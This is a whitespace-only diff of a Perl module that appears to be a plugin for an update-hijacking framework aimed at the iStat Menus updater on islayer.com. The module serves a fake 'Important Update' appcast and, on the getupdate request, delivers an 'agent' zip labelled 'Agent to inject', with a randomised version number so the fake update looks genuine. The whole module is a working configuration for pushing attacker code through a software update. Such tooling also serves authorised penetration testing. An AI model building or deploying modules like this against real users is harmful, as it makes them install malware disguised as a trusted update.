@@ -27,49 +27,54 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'iStat Menus',
-    'version' => '1.0',
-    'appver'  => '<= 2.0',
-    'author' => [ 'Federico Kirschbaum < fedek +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(islayer.com)',
-    'request' => [
-		    {
-		    'req' => '/apps/istatmenus/appcast/.',
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '<html><b>Important Update</html>',
-		    'parse' => 1,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '(/apps/istatmenus/getupdate)', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'iStat Menus',
+    'version'     => '1.0',
+    'appver'      => '<= 2.0',
+    'author'      => ['Federico Kirschbaum < fedek +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(islayer.com)',
+    'request'     => [
+        {   'req'  => '/apps/istatmenus/appcast/.',
+            'type' => 'string',                     #file|string|agent|install
+            'method' => '',                                   #any
+            'bin'    => 0,
+            'string' => '<html><b>Important Update</html>',
+            'parse'  => 1,
+            'file'   => '',
+        },
+        {   'req' => '(/apps/istatmenus/getupdate)',          #regex friendly
+            'type'   => 'agent',    #file|string|agent|install
+            'method' => '',         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/osx/istatmenus_upgrade_3.01.zip', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
+
+    #Options
+    'options' => {
+        'agent' => {
+            'val'  => './agent/osx/istatmenus_upgrade_3.01.zip',
+            'desc' => 'Agent to inject'
+        },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
 };
 
 ##########################################################################
@@ -82,5 +87,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
